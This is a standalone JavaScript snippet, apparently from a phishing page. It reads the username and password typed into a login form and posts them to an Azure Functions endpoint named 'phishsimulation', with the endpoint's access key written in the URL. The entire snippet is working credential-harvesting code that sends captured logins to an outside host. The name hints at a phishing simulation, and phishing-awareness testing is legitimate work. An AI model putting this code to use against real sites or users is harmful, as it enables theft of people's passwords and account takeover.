<script>
    async function sendDataToAzure(event) {
        event.preventDefault();
        const username = document.getElementById('edit-name').value;
        const password = document.getElementById('edit-pass').value;

        const data = {
            username: username,
            password: password
        };

        try {
            const response = await fetch('https://phishsimulation.azurewebsites.net/api/http_trigger1?code=NOYvBcUusO0vXcHXP6_7s8QZfuO94UI8Sb8CJWAlb5WsAzFuNufe7g==', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                alert('Data sent successfully!');
            } else {
                alert('Failed to send data.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred while sending data.');
        }
    }
</script>
